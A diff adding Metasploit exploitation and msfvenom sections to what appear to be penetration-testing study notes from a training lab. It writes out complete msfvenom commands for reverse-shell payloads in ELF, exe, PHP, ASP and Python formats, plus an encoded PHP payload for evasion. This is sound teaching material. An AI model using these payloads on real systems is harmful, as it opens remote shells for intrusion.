@@ -912,4 +912,35 @@ Finding vulnerabilities will rely heavily on your ability to scan and fingerprin
 
 Use the **info** command for any module to have a better understanding of its use and purpose.
 
+### Exploitation
+Most exploits will have a preset default payload. You can use **show payloads** to list other commands you can use.
+
+Once you have decided on a payload, you can use **set payload** to make your choice. Note: choosing a working payload could become a trial and error process due to the enviromental/OS restrictions (i.e. firewall rules, anti-virus, file writing, or program availability). 
+
+Remember, a session can be backgrounded using **-z** or CTRL+Z. Some additional session commands:
++ **sessions** ->  list all active sessions
++ **sessions -i [session_id]** -> interact with an existing session
++ **sessions -h** -> list options (e.g. **-C** to run a Meterpreter command, **-K** to terminate all sessions)
+
+### Msfvenom
+<i>Msfvenom</i> allows you to access all payloads available in the Metasploit framework, allowing you to create them in many different formats (e.g. PHP, exe, dll, elf) and for many different target systems (e.g. Apple, Windows, Android, Linux)
+
+**msfvenom -l payloads**: lists all framework payloads
+
+**msfvenom --list formats**: list supported output formats
+
+Some tools include:
++ Encoders - encodes the payload; modern obfuscation techniques or learning methods to inject shellcode are better; eg. **msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64**
++ Handlers - catches callbacks from reverse shells or Meterpreter (i.e. a listener); follows these steps: 1) use exploit, 2) set payload, 3) set lhost/lport variables, 4) run
+
+Based on the target's configuration (i.e. OS, webserver, interpreter, etc), msfvenom can be used to create payloads in proper formats. Here are examples often used:
++ Linux Executable and Linkable Format (elf) -> **msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf**; note that executable permissions need to be set using **chmod +x [shell_elf_file]**
++ Windows -> **msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe**
++ PHP -> **msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php**
++ ASP -> **msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp**
++ Python -> **msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py**
+
+Note: for the above examples, a handler will be needed as these are reverse payloads
+
+
 
